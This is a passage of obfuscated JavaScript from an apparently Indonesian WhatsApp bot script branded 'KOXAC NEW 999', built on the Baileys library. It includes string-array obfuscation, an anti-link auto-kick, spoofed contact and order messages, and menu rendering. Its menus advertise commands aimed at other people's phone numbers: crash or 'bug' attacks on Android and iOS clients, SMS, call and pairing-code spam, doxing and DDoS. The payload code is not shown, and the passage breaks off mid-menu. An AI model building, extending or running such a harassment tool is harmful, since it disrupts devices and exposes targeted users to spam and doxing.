                return _0x4b3457 < _0x18515c;
            },
            'ZgKig': function (_0x3e7f1e, _0x10bf12) {
                return _0x3e7f1e == _0x10bf12;
            },
            'ddNVe': function (_0xe7450e, _0x1cadf2) {
                return _0xe7450e % _0x1cadf2;
            },
            'Nqcef': function (_0x12a43b, _0x3b1cfd) {
                return _0x12a43b + _0x3b1cfd;
            },
            'QyTrP': function (_0x3e7ffe, _0x48a7e2) {
                return _0x3e7ffe + _0x48a7e2;
            },
            'OEjNn': function (_0x48f8c8, _0x4b261f) {
                return _0x48f8c8 - _0x4b261f;
            }
        }, _0x52ff76 = '', _0x3d6eb8 = _0x171d22[_0x3765b5(0x170)]()[_0x3765b5(0xbe)]('')[_0x3765b5(0x165)]()[_0x3765b5(0x104)]('');
    for (var _0x53340f = -0xdcd + -0x15 * 0x173 + 0x2c3c; _0x276e6c[_0x3765b5(0xeb)](_0x53340f, _0x3d6eb8[_0x3765b5(0x143)]); _0x53340f++)
        if (_0x276e6c[_0x3765b5(0x132)](_0x276e6c[_0x3765b5(0xec)](_0x53340f, -0x71a + -0x19ac + -0x7 * -0x4af), 0x1 * 0x1421 + -0x235 + 0x25 * -0x7c))
            _0x52ff76 += _0x276e6c[_0x3765b5(0x11e)](_0x3d6eb8[_0x3765b5(0xfd)](_0x53340f, 0x721 * -0x1 + 0x89a + -0x1 * 0x176), '.');
    return _0x276e6c[_0x3765b5(0xcf)]('', _0x52ff76[_0x3765b5(0xbe)]('', _0x276e6c[_0x3765b5(0x13f)](_0x52ff76[_0x3765b5(0x143)], -0x676 * -0x3 + 0x7 * 0x21d + -0x222c))[_0x3765b5(0x165)]()[_0x3765b5(0x104)](''));
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
var _0xed5b2c = _0x35fe;
function _0xcf91() {
    var _0x50b8cb = [
        '5826hEjvBk',
        '464TuEdkK',
        'sender',
        'https://cd',
        '328020vneqAD',
        '4250024iCAbtc',
        '2015/10/05',
        '720.png?q=',
        'nk-profile',
        '10gPgREF',
        '6145CxvzqG',
        '-picture-9',
        'com/photo/',
        'n.pixabay.',
        '/22/37/bla',
        '3426423YdiDom',
        '73460_960_',
        '11274NOttJt',
        '6226385nEzaro',
        'image',
        '9ALKhxd',
        'profilePic',
        'tureUrl',
        '81275HVgPDO'
    ];
    _0xcf91 = function () {
        return _0x50b8cb;
    };
    return _0xcf91();
}
(function (_0x284639, _0x231a1a) {
    var _0x737ffa = _0x35fe, _0x4fb6de = _0x284639();
    while (!![]) {
        try {
            var _0x20fbb4 = -parseInt(_0x737ffa(0x182)) / (0x1c97 + 0x15 * -0x14b + -0x16f) + parseInt(_0x737ffa(0x16c)) / (-0xdd1 + 0x2 * -0x496 + -0x1 * -0x16ff) * (-parseInt(_0x737ffa(0x17c)) / (-0x15a * 0x17 + 0x7 * -0x313 + -0x118a * -0x3)) + -parseInt(_0x737ffa(0x16f)) / (0x733 + -0x12b6 + -0xd * -0xe3) + parseInt(_0x737ffa(0x175)) / (0x2ba * -0xc + -0x1 * 0x136 + 0x21f3) * (parseInt(_0x737ffa(0x183)) / (-0x4fc * -0x1 + 0x1558 + -0x1a4e)) + parseInt(_0x737ffa(0x17a)) / (-0x1 * 0x1fdf + -0xafe + 0xab9 * 0x4) + -parseInt(_0x737ffa(0x170)) / (0x1 * 0xfbb + 0x192 * 0xc + 0xef * -0x25) * (-parseInt(_0x737ffa(0x17f)) / (-0x9c6 * 0x2 + -0x16d * -0x13 + -0x1f * 0x3e)) + -parseInt(_0x737ffa(0x174)) / (-0x78d + -0x9cb + 0x32 * 0x59) * (parseInt(_0x737ffa(0x17d)) / (-0x16f + 0x1128 + -0xfae));
            if (_0x20fbb4 === _0x231a1a)
                break;
            else
                _0x4fb6de['push'](_0x4fb6de['shift']());
        } catch (_0x3b2433) {
            _0x4fb6de['push'](_0x4fb6de['shift']());
        }
    }
}(_0xcf91, -0x20 * -0x5e69 + 0x36 * -0x2f74 + 0x78f9a));
function _0x35fe(_0x5529f8, _0x19b2e0) {
    var _0x54ee11 = _0xcf91();
    return _0x35fe = function (_0x5dceff, _0x5567d3) {
        _0x5dceff = _0x5dceff - (-0x1d54 + 0x1 * -0x725 + 0x25e5);
        var _0x442545 = _0x54ee11[_0x5dceff];
        return _0x442545;
    }, _0x35fe(_0x5529f8, _0x19b2e0);
}
try {
    ppuser = await zyn[_0xed5b2c(0x180) + _0xed5b2c(0x181)](m[_0xed5b2c(0x16d)], _0xed5b2c(0x17e));
} catch (_0x2b2a72) {
    ppuser = _0xed5b2c(0x16e) + _0xed5b2c(0x178) + _0xed5b2c(0x177) + _0xed5b2c(0x171) + _0xed5b2c(0x179) + _0xed5b2c(0x173) + _0xed5b2c(0x176) + _0xed5b2c(0x17b) + _0xed5b2c(0x172) + '60';
}
// FUNCTION OBFUSCATOR 
const _0x371f31 = _0x575c;
(function (_0x1e5455, _0x57afa2) {
    const _0x2a7cf0 = _0x575c, _0x404641 = _0x1e5455();
    while (!![]) {
        try {
            const _0x597fd6 = -parseInt(_0x2a7cf0(0x116)) / (-0x887 + 0xd * -0x28c + 0xd * 0x334) + -parseInt(_0x2a7cf0(0x118)) / (0xf8d * -0x1 + -0x181 * -0x7 + 0x508) + -parseInt(_0x2a7cf0(0x10a)) / (0x134d * 0x2 + -0x263d + 0x12 * -0x5) + parseInt(_0x2a7cf0(0x113)) / (0x230e + 0x152e + -0x3838) + -parseInt(_0x2a7cf0(0x11c)) / (-0x1eaf + -0x168b + 0x353f) + -parseInt(_0x2a7cf0(0x114)) / (-0x2 * -0xb3 + -0x1 * -0xe35 + 0xf95 * -0x1) * (-parseInt(_0x2a7cf0(0x10f)) / (-0x1ee1 + -0xb * 0x349 + -0x430b * -0x1)) + parseInt(_0x2a7cf0(0x11b)) / (-0xad0 + -0x21fb + -0x1cb * -0x19);
            if (_0x597fd6 === _0x57afa2)
                break;
            else
                _0x404641['push'](_0x404641['shift']());
        } catch (_0x4b8c20) {
            _0x404641['push'](_0x404641['shift']());
        }
    }
}(_0x4876, 0x17a5 * 0x54 + -0x7 * 0x9b71 + 0x29012));
async function obfus(_0x1742f2) {
    const _0x2ff336 = {
        'xERSu': function (_0x5650c0, _0x448d83) {
            return _0x5650c0(_0x448d83);
        },
        'FEvWC': function (_0x75124, _0x372a38) {
            return _0x75124(_0x372a38);
        }
    };
    return new Promise((_0x18fecd, _0x3eb081) => {
        const _0x4deb72 = _0x575c;
        try {
            const _0x380b15 = jsobfus[_0x4deb72(0x10d)](_0x1742f2, {
                    'compact': ![],
                    'controlFlowFlattening': !![],
                    'controlFlowFlatteningThreshold': 0x1,
                    'numbersToExpressions': !![],
                    'simplify': !![],
                    'stringArrayShuffle': !![],
                    'splitStrings': !![],
                    'stringArrayThreshold': 0x1
                }), _0x2fd2a7 = {
                    'status': 0xc8,
                    'author': _0x4deb72(0x120),
                    'result': _0x380b15[_0x4deb72(0x10b) + _0x4deb72(0x112)]()
                };
            _0x2ff336[_0x4deb72(0x110)](_0x18fecd, _0x2fd2a7);
        } catch (_0x1eb778) {
            _0x2ff336[_0x4deb72(0x121)](_0x3eb081, _0x1eb778);
        }
    });
}
if (!zyn[_0x371f31(0x11f)]) {
    if (!m[_0x371f31(0x11a)][_0x371f31(0x11e)])
        return;
}
function _0x575c(_0x5acd5c, _0x3baea2) {
    const _0x382f27 = _0x4876();
    return _0x575c = function (_0x4f791c, _0x36731e) {
        _0x4f791c = _0x4f791c - (0xb2 * -0x2 + -0x1 * -0x21a8 + -0x63f * 0x5);
        let _0x44aa9a = _0x382f27[_0x4f791c];
        return _0x44aa9a;
    }, _0x575c(_0x5acd5c, _0x3baea2);
}
async function loading() {
    const _0x39de0d = _0x371f31, _0x2d66c7 = {
            'XtWKi': _0x39de0d(0x111) + _0x39de0d(0x10c),
            'BusHG': _0x39de0d(0x119),
            'ilvyp': function (_0x363147, _0x525245) {
                return _0x363147 < _0x525245;
            }
        };
    var _0x5612af = [_0x2d66c7[_0x39de0d(0x10e)]];
    let {key: _0xb325df} = await zyn[_0x39de0d(0x117) + 'e'](from, { 'text': _0x2d66c7[_0x39de0d(0x115)] });
    for (let _0x46a41b = -0x1 * -0xacc + -0x39a + -0x732; _0x2d66c7[_0x39de0d(0x11d)](_0x46a41b, _0x5612af[_0x39de0d(0x109)]); _0x46a41b++) {
        await zyn[_0x39de0d(0x117) + 'e'](from, {
            'text': _0x5612af[_0x46a41b],
            'edit': _0xb325df
        });
    }
}
function _0x4876() {
    const _0x4a405e = [
        'Koxac',
        'FEvWC',
        'length',
        '670077gyREeG',
        'getObfusca',
        '𝙊𝙐𝙉𝙏𝙀𝙍',
        'obfuscate',
        'XtWKi',
        '5845GjZdHd',
        'xERSu',
        '𝙆𝙊𝙓𝘼𝘾\x20𝙉𝙊\x20𝘾',
        'tedCode',
        '2270736yXcYFE',
        '6FVfkKT',
        'BusHG',
        '730025hPQdTm',
        'sendMessag',
        '1024270vGikMt',
        '𝙒𝘼𝙄𝙏',
        'key',
        '16406264eSilJX',
        '3779640dRbbRF',
        'ilvyp',
        'fromMe',
        'public'
    ];
    _0x4876 = function () {
        return _0x4a405e;
    };
    return _0x4876();
}
        

// Fake Resize
const _0xccdd99 = _0x2616;
(function (_0x198c61, _0x3e5c8c) {
    const _0x257f55 = _0x2616, _0x28156a = _0x198c61();
    while (!![]) {
        try {
            const _0x456414 = -parseInt(_0x257f55(0xe3)) / (-0x1494 + 0x1655 + -0x1c0) + -parseInt(_0x257f55(0xb2)) / (-0x12d * -0xf + -0x1c * -0x3d + -0x184d) + -parseInt(_0x257f55(0xdb)) / (-0xedd + 0x1f4f + -0x1 * 0x106f) + -parseInt(_0x257f55(0xec)) / (0x2 * 0x67f + 0x1 * -0x1211 + -0x517 * -0x1) * (-parseInt(_0x257f55(0xc5)) / (0x1 * 0x17de + 0xc6b + -0x2444)) + parseInt(_0x257f55(0xae)) / (0x2503 + -0x1 * -0x24f5 + -0x3 * 0x18a6) * (parseInt(_0x257f55(0xe4)) / (-0x182 * 0xb + -0x37 * -0x45 + 0x1ca)) + parseInt(_0x257f55(0xb1)) / (-0x1fbc * -0x1 + 0x1a37 * -0x1 + 0x57d * -0x1) + parseInt(_0x257f55(0xd2)) / (-0x76d * 0x2 + -0x1e56 + 0x2d39) * (parseInt(_0x257f55(0xd6)) / (0x1f70 * 0x1 + 0xcbf + -0x1 * 0x2c25));
            if (_0x456414 === _0x3e5c8c)
                break;
            else
                _0x28156a['push'](_0x28156a['shift']());
        } catch (_0x3be375) {
            _0x28156a['push'](_0x28156a['shift']());
        }
    }
}(_0x4878, 0x6 * 0x40ac + 0x2 * 0x2b20d + -0x35c00));
function _0x4878() {
    const _0x41ef75 = [
        '468756DXMAQC',
        'https://g.',
        '\x0aitem1.X-A',
        'isGroup',
        'amu\x20Akan\x20D',
        'adcast',
        'inzx,;;;\x0aF',
        'pp.net',
        'ate',
        '0l0.jpg',
        'split',
        'delete',
        'VNrND',
        '𝙊𝙐𝙉𝙏𝙀𝙍',
        'map',
        'sendMessag',
        'ikeluarkan',
        '\x20Dari\x20Grou',
        'matchAll',
        '5SDCejs',
        './database',
        'eteksi*\x0a\x0aK',
        'Group\x20Terd',
        'sel\x0aEND:VC',
        'readFileSy',
        'status@bro',
        'IDR',
        'message',
        '*Antilink\x20',
        'top4top.io',
        'pjaNN',
        'match',
        '279SPJIuc',
        'BEGIN:VCAR',
        'CATALOG',
        'INQUIRY',
        '277990HSQFIf',
        'D\x0aVERSION:',
        'chat',
        ',\x0aitem1.TE',
        'fromMe',
        '1134486QTavHe',
        'BLabel:Pon',
        '/image/Xyn',
        'KrcDG',
        'subject',
        'groupParti',
        '3.0\x0aN:XL;V',
        'KuMPb',
        '252252EiPdXQ',
        '2471TGVjic',
        'z.jpg',
        'p.net',
        '/p_3194iz7',
        'relayMessa',
        'whatsapp.c',
        'ARD',
        'cipantsUpd',
        '217340fOwZKz',
        '0@s.whatsa',
        'fromObject',
        '𝙆𝙊𝙓𝘼𝘾\x20𝙉𝙊\x20𝘾',
        'L;waid=',
        'key',
        'Message',
        'imXnS',
        '498JYTMdg',
        '@s.whatsap',
        'PHOTO',
        '1214968mbMMsh'
    ];
    _0x4878 = function () {
        return _0x41ef75;
    };
    return _0x4878();
}
const fkethmb = await reSize(ppuser, 0x1ea * -0xe + 0x1 * 0x8d5 + 0x1323, -0x16a0 + 0x16fc * -0x1 + -0x5d9 * -0x8), sendOrder = async (_0x12e5ab, _0x5b0390, _0x159f30, _0x28160c, _0x402d5, _0x38f6d8, _0x353937, _0x1101b9, _0x23f6da) => {
        const _0x23f24f = _0x2616, _0x18805c = {
                'pjaNN': function (_0xa3d0e3, _0x57a71b, _0x336b2e, _0x266095) {
                    return _0xa3d0e3(_0x57a71b, _0x336b2e, _0x266095);
                },
                'imXnS': _0x23f24f(0xd5),
                'VNrND': _0x23f24f(0xd4),
                'KuMPb': _0x23f24f(0xcc)
            }, _0x1fed90 = _0x18805c[_0x23f24f(0xd0)](generateWAMessageFromContent, _0x12e5ab, proto[_0x23f24f(0xac)][_0x23f24f(0xa8)]({
                'orderMessage': {
                    'orderId': _0x159f30,
                    'thumbnail': _0x28160c,
                    'itemCount': _0x402d5,
                    'status': _0x18805c[_0x23f24f(0xad)],
                    'surface': _0x18805c[_0x23f24f(0xbe)],
                    'orderTitle': _0x38f6d8,
                    'message': _0x5b0390,
                    'sellerJid': _0x353937,
                    'token': _0x1101b9,
                    'totalAmount1000': _0x23f6da,
                    'totalCurrencyCode': _0x18805c[_0x23f24f(0xe2)]
                }
            }), {
                'userJid': _0x12e5ab,
                'quoted': m
            });
        zyn[_0x23f24f(0xe8) + 'ge'](_0x12e5ab, _0x1fed90[_0x23f24f(0xcd)], { 'messageId': _0x1fed90[_0x23f24f(0xab)]['id'] });
    }, reply = _0x184088 => {
        const _0x3b34b0 = _0x2616, _0x1248c2 = { 'KrcDG': _0x3b34b0(0xb0) };
        zyn[_0x3b34b0(0xc1) + 'e'](m[_0x3b34b0(0xd8)], {
            'text': _0x184088,
            'contextInfo': {
                'mentionedJid': [sender],
                'forwardingScore': 0x98967f,
                'isForwarded': !![],
                'externalAdReply': {
                    'showAdAttribution': !![],
                    'containsAutoReply': !![],
                    'title': _0x3b34b0(0xa9) + _0x3b34b0(0xbf),
                    'body': '' + namabot,
                    'previewType': _0x1248c2[_0x3b34b0(0xde)],
                    'thumbnailUrl': '',
                    'thumbnail': fs[_0x3b34b0(0xca) + 'nc'](_0x3b34b0(0xc6) + _0x3b34b0(0xdd) + _0x3b34b0(0xe5)),
                    'sourceUrl': '' + isLink
                }
            }
        }, { 'quoted': m });
    }, fkontak = {
        'key': {
            'fromMe': ![],
            'participant': _0xccdd99(0xed) + _0xccdd99(0xb9),
            ...from ? { 'remoteJid': _0xccdd99(0xcb) + _0xccdd99(0xb7) } : {}
        },
        'message': {
            'contactMessage': {
                'displayName': '' + pushname,
                'vcard': _0xccdd99(0xd3) + _0xccdd99(0xd7) + _0xccdd99(0xe1) + _0xccdd99(0xb8) + 'N:' + pushname + (_0xccdd99(0xd9) + _0xccdd99(0xaa)) + sender[_0xccdd99(0xbc)]('@')[-0xe92 + -0x185f + 0x26f1] + ':' + sender[_0xccdd99(0xbc)]('@')[0xfad + 0x2b * -0xe + -0x3 * 0x471] + (_0xccdd99(0xb4) + _0xccdd99(0xdc) + _0xccdd99(0xc9) + _0xccdd99(0xea)),
                'jpegThumbnail': { 'url': _0xccdd99(0xb3) + _0xccdd99(0xcf) + _0xccdd99(0xe7) + _0xccdd99(0xbb) }
            }
        }
    };
function _0x2616(_0x43f996, _0x1e0577) {
    const _0x568f4e = _0x4878();
    return _0x2616 = function (_0x5cc67f, _0x1f6e16) {
        _0x5cc67f = _0x5cc67f - (-0x1 * 0x1f2d + -0x1 * -0x505 + 0x8 * 0x35a);
        let _0x211f87 = _0x568f4e[_0x5cc67f];
        return _0x211f87;
    }, _0x2616(_0x43f996, _0x1e0577);
}
function parseMention(_0x20f498 = '') {
    const _0x391f57 = _0xccdd99;
    return [..._0x20f498[_0x391f57(0xc4)](/@([0-9]{5,16}|0)/g)][_0x391f57(0xc0)](_0x4149c8 => _0x4149c8[0x5 * -0x4aa + -0x1e5e + 0x35b1] + (_0x391f57(0xaf) + _0x391f57(0xe6)));
}
if (m[_0xccdd99(0xb5)] && !m[_0xccdd99(0xab)][_0xccdd99(0xda)] && !isOwner && antilink) {
    if (!isBotAdmins)
        return;
    budy[_0xccdd99(0xd1)](_0xccdd99(0xe9) + 'om') && (zyn[_0xccdd99(0xc1) + 'e'](m[_0xccdd99(0xd8)], { 'text': _0xccdd99(0xce) + _0xccdd99(0xc8) + _0xccdd99(0xc7) + _0xccdd99(0xb6) + _0xccdd99(0xc2) + _0xccdd99(0xc3) + 'p\x20' + groupMetadata[_0xccdd99(0xdf)] }, { 'quoted': m }), zyn[_0xccdd99(0xe0) + _0xccdd99(0xeb) + _0xccdd99(0xba)](m[_0xccdd99(0xd8)], [sender], _0xccdd99(0xbd)), zyn[_0xccdd99(0xc1) + 'e'](m[_0xccdd99(0xd8)], { 'delete': m[_0xccdd99(0xab)] }));
}

switch (command) {

case 'm': {
await loading()
darkphonk = fs.readFileSync('./database/kontol.mp3')
const version = require("baileys/package.json").version
const menu = `┏─── ｢ \`𝐊𝐎𝐗𝐀𝐂 𝐍𝐄𝐖 𝟗𝟗𝟗\` ｣ ──❐
┃╔╗╔═╦═══╦═╗╔═╗
┃║║║╔╣╔═╗╠╗╚╝╔╝
┃║╚╝╝║║─║║╚╗╔╝
┃║╔╗║║║─║║╔╝╚╗
┃║║║╚╣╚═╝╠╝╔╗╚╗
┃╚╝╚═╩═══╩═╝╚═╝
┃╔═══╦═══╗
┃║╔═╗║╔═╗║
┃║║─║║║─╚╝
┃║╚═╝║║─╔╗
┃║╔═╗║╚═╝║
┃╚╝─╚╩═══╝
┃🌐 ПΛMΛ : _*${pushname}*_
┃🤖 BӨƬ : _*${namabot}*_
┃🧑🏻‍💻 DΣV : _*${namaCreator}*_
┃📲 VΣЯƧIӨП : _*${versisc}*_
┃👁️‍🗨️ ЯЦПƬIMΣ : _*${run}*_
┗──────────────❐`
let sections = [{
title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯',
highlight_label: 'AllMenu',
rows: [{
title: '🏴‍☠️ ΛᄂMΣПЦ 🏴‍☠️', 
id: '.allmenu'
}]
},
{
highlight_label: 'BugMenu',
rows: [{
title: '☣️ ΉIƬΛMKΛП ☣️', 
id: '.bugmenu'
}]
},
{
highlight_label: 'StoreMenu',
rows: [{
title: '🛍️ MΣПЦ ƧƬӨЯΣ 🛍️', 
id: '.storemenu'
}]
},
{
highlight_label: 'ToolsMenu',
rows: [{
title: '⚒️ PΣЯΛᄂΛƬΛП ⚒️', 
id: '.toolsmenu'
}]
},
{
highlight_label: 'GrupMenu',
rows: [{
title: '✨ Gᄃ MΣПЦ ✨', 
id: '.groupmenu'
}]
},
{
highlight_label: 'OwnerMenu',
rows: [{
title: '💥 ӨЩПΣЯ MΣПЦ 💥', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Alwi.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JANGAN DITEKAN\",\"url\":\"https://youtube.com/@alwicrash\",\"merchant_url\":\"https://youtube.com/@alwicrash\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await zyn.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case 'allmenu': {
await loading()
const version = require("baileys/package.json").version
const Allmenu = `┏─── ｢ \`𝐊𝐎𝐗𝐀𝐂 𝐍𝐄𝐖 𝟗𝟗𝟗\` ｣ ──❐
┃╔╗╔═╦═══╦═╗╔═╗
┃║║║╔╣╔═╗╠╗╚╝╔╝
┃║╚╝╝║║─║║╚╗╔╝
┃║╔╗║║║─║║╔╝╚╗
┃║║║╚╣╚═╝╠╝╔╗╚╗
┃╚╝╚═╩═══╩═╝╚═╝
┃╔═══╦═══╗
┃║╔═╗║╔═╗║
┃║║─║║║─╚╝
┃║╚═╝║║─╔╗
┃║╔═╗║╚═╝║
┃╚╝─╚╩═══╝
┃🌐 ПΛMΛ : _*${pushname}*_
┃🤖 BӨƬ : _*${namabot}*_
┃🧑🏻‍💻 DΣV : _*${namaCreator}*_
┃📲 VΣЯƧIӨП : _*${versisc}*_
┃👁️‍🗨️ ЯЦПƬIMΣ : _*${run}*_
┗──────────────❐

┏─『 \`KӨXΛᄃ BЦG\` 』
│ ㉿ ΉIƬΛM ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ PΛПƬΣK ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ KӨXΛᄃ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ PЦKIMΛK ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ IPΉӨПΣ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ XIӨƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ XΛПDЯӨ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ΛƬƬΛᄃK ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ӨVΣЯFᄂӨЩ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ VΛƧIӨП ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ᄃЯΛƧΉFᄂӨЩ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ПΛJIƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ΣЯЯӨЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ BЦBΛЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧΛDIƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
┗──────────────❐
┏ƧPΣƧIΛᄂ BЦG KӨXΛᄃ
│ ㉿ ΛᄂЩIGΛПƬΣПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ GΛᄃӨЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ΛᄃЦMΛᄂΛKΛ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ DӨЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ KӨKΉIᄂΛПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ XΛᄂЩI ⇏✆ɴᴜᴍʙᴇʀ⇍
┗──────────────❐
┏─『 \`BЦG ӨЩПΣЯ\` 』
│ ㉿ XΛᄂЩI ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ KӨDΣ ӨƬP ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧPΛM ƧMƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧPΛM PΛIЯIПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧPΛM ᄃΛᄂᄂ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ DӨXIПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ DDӨƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
┗──────────────❐

┏─『 \`ӨЩПΣЯ MΣПЦ\` 』
│ ㉿ ΛDDӨЩПΣЯ
│ ㉿ ΛDDPЯΣM
│ ㉿ DΣᄂᄂӨЩПΣЯ
│ ㉿ DΣᄂᄂPЯΣM
│ ㉿ PЦBᄂIᄃ
│ ㉿ ƧΣᄂF
│ ㉿ ƧƬIᄃKΣЯ
│ ㉿ ƬӨIMG 
│ ㉿ ƬӨVID
┗─────────────❐

┏─『 \`PΣЯΛᄂΛƬΛП\` 』
│ ㉿ ΣПᄃ <ᄃӨDΣ>
│ ㉿ ΣПᄃЯYPƬ <ᄃӨDΣ>
│ ㉿ ΛI <ƬΣXƬ>
│ ㉿ ΉIDΣƬΛG <ƬΣXƬ>
│ ㉿ ƬΛGΛᄂᄂ
┗─────────────❐

┏─『 \`Gᄃ MΣПЦ\` 』
│ ㉿ ΉIDΣƬΛG <ƬΣXƬ>
│ ㉿ ƬΛGΛᄂᄂ
│ ㉿ KIᄃK <ƬΛG> 
│ ㉿ PЯӨMӨƬΣ <ƬΛG>
│ ㉿ DΣMӨƬΣ <ƬΛG> 
│ ㉿ ƧΣƬ PP
│ ㉿ ƧΣƬ DΣƧK
│ ㉿ ƧΣƬ ПΛMΣ
┗─────────────❐

┏─『 \`ƧƬӨЯΣ MΣПЦ\` 』
│ ㉿ PΛYMΣПƬ
│ ㉿ DΛПΛMΛƧЦK
│ ㉿ PЯӨƧΣƧ
│ ㉿ DӨПΣ
│ ㉿ JPMPЯӨMӨƧI
│ ㉿ JPM3
│ ㉿ ᄂIƧƬ ΛDD
│ ㉿ ᄂIƧƬDΣᄂᄂ
│ ㉿ IƧƬЦPDΛƬΣ
│ ㉿ JΣDΛ
┗─────────────❐`
let sections = [{
title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯',
highlight_label: 'AllMenu',
rows: [{
title: '🏴‍☠️ ΛᄂMΣПЦ 🏴‍☠️', 
id: '.allmenu'
}]
},
{
highlight_label: 'BugMenu',
rows: [{
title: '☣️ ΉIƬΛMKΛП ☣️', 
id: '.bugmenu'
}]
},
{
highlight_label: 'StoreMenu',
rows: [{
title: '🛍️ MΣПЦ ƧƬӨЯΣ 🛍️', 
id: '.storemenu'
}]
},
{
highlight_label: 'ToolsMenu',
rows: [{
title: '⚒️ PΣЯΛᄂΛƬΛП ⚒️', 
id: '.toolsmenu'
}]
},
{
highlight_label: 'GrupMenu',
rows: [{
title: '✨ Gᄃ MΣПЦ ✨', 
id: '.groupmenu'
}]
},
{
highlight_label: 'OwnerMenu',
rows: [{
title: '💥 ӨЩПΣЯ MΣПЦ 💥', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: `
██╗░░██╗
██║░██╔╝
█████═╝░
██╔═██╗░
██║░╚██╗
╚═╝░░╚═╝

░█████╗░
██╔══██╗
██║░░██║
██║░░██║
╚█████╔╝
░╚════╝░

██╗░░██╗
╚██╗██╔╝
░╚███╔╝░
░██╔██╗░
██╔╝╚██╗
╚═╝░░╚═╝

░█████╗░
██╔══██╗
███████║
██╔══██║
██║░░██║
╚═╝░░╚═╝

░█████╗░
██╔══██╗
██║░░╚═╝
██║░░██╗
╚█████╔╝
░╚════╝░`
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Alwi.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"LIST MENUNYA\",\"url\":\"https://d.top4top.io/p_32061ajl91.jpg\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'bugmenu': {
await loading()
const version = require("baileys/package.json").version
const bugmenu = `┏─── ⌜ \`𝐊𝐎𝐗𝐀𝐂 𝐍𝐄𝐖 𝟗𝟗𝟗\` ⌟ ──❐
┃╔╗╔═╦═══╦═╗╔═╗
┃║║║╔╣╔═╗╠╗╚╝╔╝
┃║╚╝╝║║─║║╚╗╔╝
┃║╔╗║║║─║║╔╝╚╗
┃║║║╚╣╚═╝╠╝╔╗╚╗
┃╚╝╚═╩═══╩═╝╚═╝
┃╔═══╦═══╗
┃║╔═╗║╔═╗║
┃║║─║║║─╚╝
┃║╚═╝║║─╔╗
┃║╔═╗║╚═╝║
┃╚╝─╚╩═══╝
┃🌐 ПΛMΛ : _*${pushname}*_
┃🤖 BӨƬ : _*${namabot}*_
┃🧑🏻‍💻 DΣV : _*${namaCreator}*_
┃📲 VΣЯƧIӨП : _*${versisc}*_
┃👁️‍🗨️ ЯЦПƬIMΣ : _*${run}*_
